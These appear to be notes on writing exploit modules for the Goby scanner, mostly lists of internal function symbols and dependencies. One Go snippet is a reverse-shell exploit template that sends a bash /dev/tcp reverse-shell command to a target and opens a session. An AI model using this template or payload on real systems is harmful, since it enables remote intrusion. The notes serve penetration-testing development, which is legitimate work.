# goby exp函数



使用的库

```
github.com/patrickmn/go-cache
encoding/gob
```



## goclient

### 导入库

```
"git.gobies.org/goby/goscanner/godclient"
```

### 函数

#### GetGodServerIP

#### genPullDomain

#### Pull

#### GetGid

#### PullDNS

#### GetBind

#### GetKey

#### ConnectBind

#### WaitMessage

#### WaitSession

#### PullDNSExists

#### PullExists

#### WaitSession

#### GetGodServerHost

#### GetGodServerHost

#### GetGodFullSubdomain

#### GetSubdomain

#### GetGodCheckURL

#### PullExists

#### GetGid

#### GetKey

#### IsDomain

#### GodClient

#### RequestInfo

#### apiResult



#### 反弹shell

ReverseTCPByPowershell

ReverseTCPByBash

ReverseTCPBySh

ReverseTCPByNcBsd

```go
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			waitSessionCh := make(chan string)
			if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
        
				//ReverseTCPByBash 返回的是 bash -i >& /dev/tcp/godserver/reverseport 也就是rp
				//ReverseTCPBySh 
				//ReverseTCPByPowershell
				//ReverseTCPByNcBsd
				cmd := godclient.ReverseTCPByNcBsd(rp)
				//检测逻辑发送数据开始
				postData(expResult.HostInfo, cmd)
				//检测逻辑发送数据结束
        
				//检测为固定格式
				select {
				case webConsleID := <-waitSessionCh:
					log.Println("[DEBUG] session created at:", webConsleID)
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
				}
			}
			return expResult
		}
```



## goutils

```
git.gobies.org/goby/goscanner/goutils.IsValidIP
git.gobies.org/goby/goscanner/goutils.GetFileName
git.gobies.org/goby/goscanner/goutils.B2I
git.gobies.org/goby/goscanner/goutils.B2S
git.gobies.org/goby/goscanner/goutils.GetJSONValueByPath
git.gobies.org/goby/goscanner/goutils.StartHTTPStaticServer
git.gobies.org/goby/goscanner/goutils.StartJMILDAPServer
git.gobies.org/goby/goscanner/goutils.StringSliceContains
git.gobies.org/goby/goscanner/goutils.UniqStrings
git.gobies.org/goby/goscanner/goutils.GetStringInBetween
git.gobies.org/goby/goscanner/goutils.ToHex
git.gobies.org/goby/goscanner/goutils.RandomHexString
git.gobies.org/goby/goscanner/goutils.ToUnicode
git.gobies.org/goby/goscanner/goutils.UUIDv4
git.gobies.org/goby/goscanner/goutils.ExtractAllStringSubmatch
git.gobies.org/goby/goscanner/goutils.(*HostSysInfo).String
git.gobies.org/goby/goscanner/goutils.(*HostSysInfo).UpTimeString
git.gobies.org/goby/goscanner/goutils.run
git.gobies.org/goby/goscanner/goutils.trim
git.gobies.org/goby/goscanner/goutils.machineID
git.gobies.org/goby/goscanner/goutils.extractID
git.gobies.org/goby/goscanner/goutils.GetMarchineID
github.com/shirou/gopsutil/host.Info
git.gobies.org/goby/goscanner/goutils.GetSysInfo
git.gobies.org/goby/goscanner/goutils.FileExists
git.gobies.org/goby/goscanner/goutils.LoadFirstExistsFile
git.gobies.org/goby/goscanner/goutils.LoadFileFromDefaultDir
git.gobies.org/goby/goscanner/goutils.GetCurrentProcessFileDir
git.gobies.org/goby/goscanner/goutils.UserHomeDir
git.gobies.org/goby/goscanner/goutils.ExecCmdWithTimeout
git.gobies.org/goby/goscanner/goutils.VersionBetween
git.gobies.org/goby/goscanner/goutils.StartHTTPStaticServer.func1.1
git.gobies.org/goby/goscanner/goutils.StartHTTPStaticServer.func1
git.gobies.org/goby/goscanner/goutils.StartJMILDAPServer.func1
git.gobies.org/goby/goscanner/goutils.StartJMILDAPServer.func2
git.gobies.org/goby/goscanner/goutils.ExecCmdWithTimeout.func1
git.gobies.org/goby/goscanner/goutils.ExecCmdWithTimeout.func2
git.gobies.org/goby/goscanner/goutils.init
github.com/Masterminds/goutils.CryptoRandom
github.com/Masterminds/goutils.getCryptoRandomInt
github.com/Masterminds/goutils.AbbreviateFull
github.com/Masterminds/goutils.Abbreviate
github.com/Masterminds/goutils.DeleteWhiteSpace
github.com/Masterminds/goutils.WrapCustom
github.com/Masterminds/goutils.Uncapitalize
github.com/Masterminds/goutils.SwapCase
github.com/Masterminds/goutils.Initials
github.com/Masterminds/goutils.isDelimiter
github.com/Masterminds/goutils.init
github.com/Masterminds/goutils.CryptoRandomAlphaNumeric
github.com/Masterminds/sprig.randAlpha
github.com/Masterminds/goutils.CryptoRandomAlphabetic
github.com/Masterminds/sprig.randAscii
github.com/Masterminds/goutils.CryptoRandomAscii
github.com/Masterminds/sprig.randNumeric
github.com/Masterminds/goutils.CryptoRandomNumeric
git.gobies.org/goby/goscanner/goutils.ShellDoubleQuoteEscape
```

### httpclient

```
git.gobies.org/goby/httpclient/encoding.UTF8
git.gobies.org/goby/httpclient/encoding.getEncodingFromBody
git.gobies.org/goby/httpclient/encoding.getEncodingFromHeader
git.gobies.org/goby/httpclient/encoding.guess
git.gobies.org/goby/httpclient/encoding.Guess
git.gobies.org/goby/httpclient/encoding.UTF8.func1
git.gobies.org/goby/httpclient/encoding.init
git.gobies.org/goby/httpclient.UTF8StringFromEncoding
git.gobies.org/goby/httpclient.ByteToValidUTF8
git.gobies.org/goby/httpclient.NewFixUrl
git.gobies.org/goby/httpclient.(*FixUrl).Scheme
git.gobies.org/goby/httpclient.(*FixUrl).String
git.gobies.org/goby/httpclient.(*FixUrl).ResolveReference
git.gobies.org/goby/httpclient.(*FixUrl).PathWithQuery
git.gobies.org/goby/httpclient.(*FixUrl).RawQuery
git.gobies.org/goby/httpclient.(*FixUrl).Query
git.gobies.org/goby/httpclient.(*FixUrl).GetAuth
git.gobies.org/goby/httpclient.IPOfHost
git.gobies.org/goby/httpclient.(*FixUrl).MustIP
git.gobies.org/goby/httpclient.(*HeaderString).Add
git.gobies.org/goby/httpclient.(*HeaderString).DeleteByName
git.gobies.org/goby/httpclient.(*HeaderString).String
git.gobies.org/goby/httpclient.(*HeaderString).SortString
git.gobies.org/goby/httpclient.(*HttpResponse).Size
git.gobies.org/goby/httpclient.SetDefaultProxy
git.gobies.org/goby/httpclient.setFollowing
git.gobies.org/goby/httpclient.setHeader
git.gobies.org/goby/httpclient.setProxy
git.gobies.org/goby/httpclient.transformIfGb2312
git.gobies.org/goby/httpclient.GetStringInBetween
git.gobies.org/goby/httpclient.NewHttpResponse
git.gobies.org/goby/httpclient.NewRequestConfig
git.gobies.org/goby/httpclient.NewGetRequestConfig
git.gobies.org/goby/httpclient.NewPostRequestConfig
git.gobies.org/goby/httpclient.DoHttpRequest
git.gobies.org/goby/httpclient.setVerifyTls
git.gobies.org/goby/httpclient.SimpleGetJSON
git.gobies.org/goby/httpclient.SimpleGet
git.gobies.org/goby/httpclient.GetWitchBasic
git.gobies.org/goby/httpclient.init.0
git.gobies.org/goby/httpclient.(*DefaultTCPDialer).Dial
git.gobies.org/goby/httpclient.newHTTPProxy
git.gobies.org/goby/httpclient.(*httpProxy).Dial
git.gobies.org/goby/httpclient.httpsDialer.Dial
git.gobies.org/goby/httpclient.GetTCPConnWithProxy
git.gobies.org/goby/httpclient.GetTCPConn
git.gobies.org/goby/httpclient.GetUDPConn
git.gobies.org/goby/httpclient.GetConn
git.gobies.org/goby/httpclient.setFollowing.func1
git.gobies.org/goby/httpclient.setFollowing.func2
git.gobies.org/goby/httpclient.setHeader.func1
type..eq.git.gobies.org/goby/httpclient.FixUrl
type..eq.git.gobies.org/goby/httpclient.HttpResponse
git.gobies.org/goby/httpclient.(*HttpResponse).Cookies
git.gobies.org/goby/httpclient.(*HttpResponse).Location
git.gobies.org/goby/httpclient.(*HttpResponse).ProtoAtLeast
git.gobies.org/goby/httpclient.(*HttpResponse).Write
git.gobies.org/goby/httpclient.HttpResponse.Cookies
git.gobies.org/goby/httpclient.HttpResponse.Location
git.gobies.org/goby/httpclient.HttpResponse.ProtoAtLeast
git.gobies.org/goby/httpclient.HttpResponse.Write
type..eq.git.gobies.org/goby/httpclient.httpProxy
git.gobies.org/goby/httpclient.(*httpsDialer).Dial
git.gobies.org/goby/httpclient.SetDefaultUserAgent
```

### scanconfig

```
git.gobies.org/goby/goscanner/scanconfig.NewFofaScannerConfig
git.gobies.org/goby/goscanner/scanconfig.(*FofaScannerConfig).GetConn
git.gobies.org/goby/goscanner/scanconfig.(*FofaScannerConfig).ParseJsonExpParam
git.gobies.org/goby/goscanner/scanconfig.(*FofaScannerConfig).GetExpParamString
git.gobies.org/goby/goscanner/scanconfig.(*FofaScannerConfig).SetJsonExpLoadDir
git.gobies.org/goby/goscanner/scanconfig.(*ScanTask).SetAllSize
git.gobies.org/goby/goscanner/scanconfig.(*ScanTask).AddQueueSize
git.gobies.org/goby/goscanner/scanconfig.(*ScanTask).AddProcessedSize
git.gobies.org/goby/goscanner/scanconfig.(*ScanTask).AddVulnerableSize
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).AddLog
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).AddNetworkPacket
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).VulnerableOfVulFile
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).SetCheckVulFileFn
git.gobies.org/goby/goscanner/scanconfig.NewSingleScanConfigFull
git.gobies.org/goby/goscanner/scanconfig.NewScanTask
git.gobies.org/goby/goscanner/scanconfig.NewSingleScanConfig
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).LastHttpTrans
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).LastCookie
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).VulnerableOfVulFile.func1
type..eq.git.gobies.org/goby/goscanner/scanconfig.NetworkPacket
git.gobies.org/goby/goscanner/scanconfig.(*SingleScanConfig).AddNetworkPacket-fm
```

jsonvul

```
git.gobies.org/goby/goscanner/jsonvul/protocols.FTPCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.MsSQLCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.MySQLCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.PostgresCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.NewSession
git.gobies.org/goby/goscanner/jsonvul/protocols.validateOptions
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).Debug
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).NewSessionSetup1Req
git.gobies.org/goby/goscanner/jsonvul/protocols.newHeader
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).NewSessionSetup2Req
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).NegotiateProtocol
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).NewNegotiateReq
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).TreeDisconnect
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).NewTreeDisconnectReq
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).Close
git.gobies.org/goby/goscanner/jsonvul/protocols.(*SMBSession).send
git.gobies.org/goby/goscanner/jsonvul/protocols.SMBCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.SNMPCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.isFalsePositiveBanner
git.gobies.org/goby/goscanner/jsonvul/protocols.DialWithDeadline
git.gobies.org/goby/goscanner/jsonvul/protocols.SSHExecAttempt
git.gobies.org/goby/goscanner/jsonvul/protocols.SSHDialAttempt
git.gobies.org/goby/goscanner/jsonvul/protocols.challengeReponder
git.gobies.org/goby/goscanner/jsonvul/protocols.genAuthMethod
git.gobies.org/goby/goscanner/jsonvul/protocols.isPrivateKey
git.gobies.org/goby/goscanner/jsonvul/protocols.SSHAuthAttempt
git.gobies.org/goby/goscanner/jsonvul/protocols.SSHCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.noyoudont
git.gobies.org/goby/goscanner/jsonvul/protocols.authcheck
git.gobies.org/goby/goscanner/jsonvul/protocols.IsLoginOkOfContent
git.gobies.org/goby/goscanner/jsonvul/protocols.TelnetCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.newSession
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).sub
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).deny
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).wont
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).dont
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).skipSubneg
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).cmd
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).do
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).will
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).tryReadByte
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).ReadAll
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).readUntil
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).ReadByte
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).Write
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).WriteLine
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).WriteString
git.gobies.org/goby/goscanner/jsonvul/protocols.NewTelnetSession
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).SetUnixWriteMode
git.gobies.org/goby/goscanner/jsonvul/protocols.(*Session).ReadUntil
git.gobies.org/goby/goscanner/jsonvul/protocols.TelnetExec
git.gobies.org/goby/goscanner/jsonvul/protocols.VNCCheck
git.gobies.org/goby/goscanner/jsonvul/protocols._Cfunc_CString
git.gobies.org/goby/goscanner/jsonvul/protocols._Cfunc_free
git.gobies.org/goby/goscanner/jsonvul/protocols._Cfunc_rdpcheck
git.gobies.org/goby/goscanner/jsonvul/protocols._cgo_cmalloc
git.gobies.org/goby/goscanner/jsonvul/protocols.RDPCheck
git.gobies.org/goby/goscanner/jsonvul/protocols.challengeReponder.func1
git.gobies.org/goby/goscanner/jsonvul/protocols.RDPCheck.func1.1
git.gobies.org/goby/goscanner/jsonvul/protocols.RDPCheck.func1.2
git.gobies.org/goby/goscanner/jsonvul/protocols.RDPCheck.func1.3
git.gobies.org/goby/goscanner/jsonvul/protocols.RDPCheck.func1
type..eq.git.gobies.org/goby/goscanner/jsonvul/protocols.SMBOptions
type..eq.git.gobies.org/goby/goscanner/jsonvul/protocols.Session
git.gobies.org/goby/goscanner/jsonvul.defaultMissingExternal
git.gobies.org/goby/goscanner/jsonvul.NewJsonVul
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).loadReference
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).AddReferences
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).MakeRequest
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).GetVulInfo
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).GetFileName
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).ContainsTag
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).ParseString
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).loadScanSteps
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).loadExploitsSteps
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).LoadJsonFile
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).ToJSON
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).SaveToJSONFile
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoScanSteps
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Vulnerable
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoExploitSteps
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Exploit
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).GenExploitResult
git.gobies.org/goby/goscanner/jsonvul.NewExploitResult
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).GetQuery
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).query
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).NewFofaCli
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).QueryOneHost
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoWork
git.gobies.org/goby/goscanner/jsonvul.sliceContains
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).isBlockScan
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).SetNewSingleScanConfigFn
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoScanOneHost
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Scan
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoExploitOneHost
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoExploits
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).ParseExpParams
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).IsTestDir
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).HasExploit
git.gobies.org/goby/goscanner/jsonvul.(*ScanRemoteExec).Execute
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).BuildScanUrl
git.gobies.org/goby/goscanner/jsonvul.LoadUserPassPairsFromFiles
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).loadUserPassPairs
git.gobies.org/goby/goscanner/jsonvul.is401
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).httpBasicCheck
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).httpFormCheck
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).bruteOne
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).BruteCheck
git.gobies.org/goby/goscanner/jsonvul.(*netProbe).Close
git.gobies.org/goby/goscanner/jsonvul.(*netProbe).getTCP
git.gobies.org/goby/goscanner/jsonvul.(*netProbe).Write
git.gobies.org/goby/goscanner/jsonvul.readn
git.gobies.org/goby/goscanner/jsonvul.(*netProbe).Read
git.gobies.org/goby/goscanner/jsonvul.keepSafe
git.gobies.org/goby/goscanner/jsonvul.randomHex
git.gobies.org/goby/goscanner/jsonvul.getValueOfType
git.gobies.org/goby/goscanner/jsonvul.(*ScanNetTestRequest).GetStringValue
git.gobies.org/goby/goscanner/jsonvul.(*ScanNetTestResponseTest).GetStringValue
git.gobies.org/goby/goscanner/jsonvul.(*ScanNetTestIter).Check
git.gobies.org/goby/goscanner/jsonvul.(*ScanNetTest).Check
git.gobies.org/goby/goscanner/jsonvul.newProbe
git.gobies.org/goby/goscanner/jsonvul.(*netProbe).setConn
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).GetRequest
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).GetResponseTest
git.gobies.org/goby/goscanner/jsonvul.(*ScanBruteForce).GetSetVariable
git.gobies.org/goby/goscanner/jsonvul.(*ScanStep).GetRequest
git.gobies.org/goby/goscanner/jsonvul.(*ScanStep).GetResponseTest
git.gobies.org/goby/goscanner/jsonvul.(*ScanStep).GetSetVariable
git.gobies.org/goby/goscanner/jsonvul.(*ScanRequest).ProcessData
git.gobies.org/goby/goscanner/jsonvul.(*ScanRequest).ProcessCookie
git.gobies.org/goby/goscanner/jsonvul.(*ScanRequest).SetHeaders
git.gobies.org/goby/goscanner/jsonvul.(*ScanRequest).GetHeader
git.gobies.org/goby/goscanner/jsonvul.(*ScanRequest).Copy
github.com/jinzhu/copier.Copy
git.gobies.org/goby/goscanner/jsonvul.ParseScanReuqestFromString
git.gobies.org/goby/goscanner/jsonvul.init.0
git.gobies.org/goby/goscanner/jsonvul.FixVariable
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).ProcessVariable
git.gobies.org/goby/goscanner/jsonvul.getVariable
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).SetVariable
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).SetVariables
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).MakeRequest
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).IsTestDir
git.gobies.org/goby/goscanner/jsonvul.TestInt
git.gobies.org/goby/goscanner/jsonvul.TestString
git.gobies.org/goby/goscanner/jsonvul.getInt
git.gobies.org/goby/goscanner/jsonvul.(*ScanResponseTest).ExecuteItem
git.gobies.org/goby/goscanner/jsonvul.(*ScanResponseTest).CheckResponse
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).ExecuteHTTPReqestAndTester
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).ExecuteStep
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).parseSteps
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).ExcuteScansteps
git.gobies.org/goby/goscanner/jsonvul.loadRequest
git.gobies.org/goby/goscanner/jsonvul.loadScanStep
git.gobies.org/goby/goscanner/jsonvul.ParseScanSteps
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).UpdateVulByCVE
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).UpdateVulByCNVD
git.gobies.org/goby/goscanner/jsonvul.NewJsonVul.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Vulnerable.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Exploit.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).query.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).QueryOneHost.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoWork.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).Scan.func1
git.gobies.org/goby/goscanner/jsonvul.(*JsonVul).DoExploits.func1
git.gobies.org/goby/goscanner/jsonvul.getValueOfType.func1
git.gobies.org/goby/goscanner/jsonvul.getValueOfType.func2
git.gobies.org/goby/goscanner/jsonvul.getValueOfType.func3
git.gobies.org/goby/goscanner/jsonvul.getValueOfType.func4
git.gobies.org/goby/goscanner/jsonvul.getValueOfType.func5
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).ProcessVariable.func1
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).Lock
git.gobies.org/goby/goscanner/jsonvul.(*ScanSteps).Unlock
git.gobies.org/goby/goscanner/jsonvul.SetDebugLevel
git.gobies.org/goby/goscanner/jsonvul.SetDailFunc
```



## goby使用的库

```
github.com/zmap/zgrab2
github.com/zmap/zcrypto
github.com/xo/dburl
github.com/xi2/xz
github.com/weppos/publicsuffix-go
github.com/vmihailenco/msgpack
github.com/ulikunitz/xz
github.com/traefik/yaegi
github.com/tklauser/go-sysconf
github.com/tidwall/pretty
github.com/tidwall/match
github.com/tidwall/gjson
github.com/tdewolff/parse
github.com/stacktitan/smb
github.com/ssdb/gossdb
github.com/spiffe/go-spiffe
github.com/spaolacci/murmur3
github.com/shirou/gopsutil
github.com/sergi/go-diff
github.com/prataprc/goparsec
github.com/pquerna/ffjson
github.com/pkg/errors
github.com/pierrec/lz4
github.com/patrickmn/go-cache
github.com/olivere/elastic
github.com/nwaples/rardecode
github.com/nfnt/resize
github.com/mitchellh/reflectwalk
github.com/mitchellh/mapstructure
github.com/mitchellh/go-vnc
github.com/mitchellh/go-homedir
github.com/mitchellh/copystructure
github.com/mingzhaodotname/dhcp4
github.com/miekg/dns
github.com/mholt/archiver
github.com/mattn/go-sqlite3
github.com/mailru/easyjson
github.com/lib/pq
github.com/kolo/xmlrpc
github.com/klauspost/oui
github.com/kennygrant/sanitize
github.com/kabukky/httpscerts
github.com/jsummers/gobmp
github.com/josharian/intern
github.com/jlaffaye/ftp
github.com/jinzhu/copier
github.com/jaypipes/pcidb
github.com/jaypipes/ghw
github.com/imroc/req
github.com/imdario/mergo
github.com/huin/goupnp
github.com/huandu/xstrings
github.com/hillu/go-yara
github.com/hashicorp/go-version
github.com/gosnmp/gosnmp
github.com/gorilla/websocket
github.com/gorilla/mux
github.com/google/uuid
github.com/google/gopacket
github.com/golang/snappy
github.com/golang/protobuf
github.com/golang-sql/civil
github.com/gogo/protobuf
github.com/gobwas/ws
github.com/gobwas/pool
github.com/gobwas/httphead
github.com/go-sql-driver/mysql
github.com/go-ldap/ldap/v3
github.com/go-asn1-ber/asn1-ber
github.com/ghodss/yaml
github.com/dsnet/compress
github.com/denisenkom/go-mssqldb
github.com/corona10/goimagehash
github.com/chromedp/sysutil
github.com/chromedp/chromedp
github.com/chromedp/cdproto
github.com/caucy/batch_ping
github.com/bradleypeabody/godap
github.com/biessek/golang-ico
github.com/axgle/mahonia
github.com/autom8ter/dagger
github.com/andybalholm/cascadia
github.com/PuerkitoBio/goquery
github.com/Masterminds/sprig
github.com/Masterminds/semver
github.com/Masterminds/goutils
github.com/Knetic/govaluate
github.com/Azure/go-ntlmssp
git.gobies.org/goby/portscanner
git.gobies.org/goby/httpclient
git.gobies.org/goby/grabscanner
git.gobies.org/goby/goscanner
git.gobies.org/goby/goby/cmd/goby-cmd
git.gobies.org/goby/goby
git.gobies.org/goby/fofaqueryparser
git.gobies.org/goby/crawler
git.gobies.org/goby/bmhtags
git.gobies.org/goby/appscanner
```

